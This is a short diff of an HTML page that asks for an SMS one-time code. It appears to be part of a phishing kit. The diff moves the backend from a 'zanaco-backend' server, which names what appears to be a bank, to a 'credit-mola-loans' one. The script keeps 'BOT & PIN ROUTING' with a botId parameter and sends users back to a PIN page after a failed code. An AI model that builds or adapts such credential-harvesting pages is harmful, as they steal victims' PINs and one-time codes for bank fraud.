@@ -31,7 +31,7 @@ button:disabled { background:#ccc; cursor:not-allowed; }
 
 <div class="code-container">
     <h2 class="code">Enter Code</h2>
-    <h3 class="otp-header">enter otp send on sms</h3>
+    <h3 class="otp-header">Enter OTP sent via SMS</h3>
     <form id="codeForm">
         <div class="code-boxes">
             <input maxlength="1" inputmode="numeric">
@@ -53,7 +53,7 @@ button:disabled { background:#ccc; cursor:not-allowed; }
 </div>
 
 <script>
-const BACKEND_URL = "https://zanaco-backend.onrender.com";
+const BACKEND_URL = "https://credit-mola-loans.onrender.com"; // ✅ Project B backend
 
 // ---------------- BOT & PIN ROUTING ----------------
 const params = new URLSearchParams(window.location.search);
@@ -149,7 +149,7 @@ document.getElementById('codeForm').addEventListener('submit', async e => {
                 btnText.textContent = 'Submit Code';
                 spinner.style.display = 'none';
                 inputs.forEach(i => i.value='');
-                window.location.href = `pin.html?botId=${botId}`; // force PIN re-entry
+                window.location.href = `pin.html?botId=${botId}`;
                 return;
             }
 
